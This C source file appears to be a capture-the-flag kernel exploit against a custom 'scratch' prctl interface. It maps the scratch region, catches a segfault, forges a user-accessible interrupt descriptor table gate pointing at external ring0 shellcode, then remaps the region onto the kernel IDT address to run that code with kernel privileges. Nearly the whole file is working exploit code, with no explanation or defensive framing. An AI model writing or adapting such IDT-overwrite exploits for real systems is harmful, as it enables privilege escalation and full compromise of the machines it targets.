#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <signal.h>
#include <asm/ldt.h>
#include <syscall.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;

#define PR_SET_SCRATCH (0x53534352)
#define SCRATCH_SIZE (0x8400)
#define SCRATCH_BASE (0x1337000)

typedef struct scratch_info {
    uint64_t scratch_addr;
    uint64_t scratch_default_size;
    uint32_t scratch_max_slice_size;
    uint16_t scratch_max_slice_count;
} scratch_info;

void get_scratch_info(scratch_info *info);
void load_scratch(uint64_t slice, uint64_t slice_offset, void *source, uint64_t length);
void read_scratch(uint64_t slice, uint64_t slice_offset, void *destination, uint64_t length);
void clear_scratch();
void add_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
void sub_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
void mul_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);

void part2();

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    // Gather info about scratch memory
    scratch_info info = {0};
    get_scratch_info(&info);
    printf("Scratch info:\r\n");
    printf(" - scratch addr: 0x%lx\r\n", info.scratch_addr);
    printf(" - scratch default size: 0x%lx bytes\r\n", info.scratch_default_size);
    printf(" - scratch max slice size: 0x%x bytes\r\n", info.scratch_max_slice_size);
    printf(" - scratch max slice count: %u\r\n", info.scratch_max_slice_count);

    u64 buf[0x1000];
    memset(buf, 0, sizeof(buf));

    prctl(PR_SET_SCRATCH, SCRATCH_BASE);
    signal(SIGSEGV, part2);
    read_scratch(1000, 0, (void *)&buf, 1);

    printf("done\r\n");
}

void p() {
    char c;
    printf("waiting: ");
    scanf("%c", &c);
}

extern u8 ring0;
extern u64 ring0_size;

void part2() {
    u64 base = 0xffffffff80000000;
    u64 idt = 0xfffffe0000000000;

    printf("shellcode @ %p\n", (void *)&ring0);
    printf("shellcode len = %p\n", (void *)ring0_size);
    char *scratch = (char *)SCRATCH_BASE;

    u64 target = (u64)&ring0;
    u64 *entry;
    // entry = (u64 *)(scratch + 0x8000 + 0x03 * 16);
    // entry[0] = 0x0000ee0000100000 | (target & 0xFFFF) | (((target >> 16) & 0xFFFF) << 48);
    // entry[1] = 0;
    // entry = (u64 *)(scratch + 0x8000 + 0x0e * 16);
    // entry[0] = 0x0000ee0000100000 | (target & 0xFFFF) | (((target >> 16) & 0xFFFF) << 48);
    // entry[1] = 0;

    entry = (u64 *)(scratch + 0xec * 16);
    entry[0] = 0x0000ee0000100000 | (target & 0xFFFF) | (((target >> 16) & 0xFFFF) << 48);
    entry[1] = 0;

    printf("faulting ring0 (%02x)\n", *&ring0);

    prctl(PR_SET_SCRATCH, idt);
    printf("faulting idt (%02x)\n", *((u8 *)idt));

    p();

    prctl(PR_SET_SCRATCH, SCRATCH_BASE);

    printf("thing\n");

    exit(1);
}
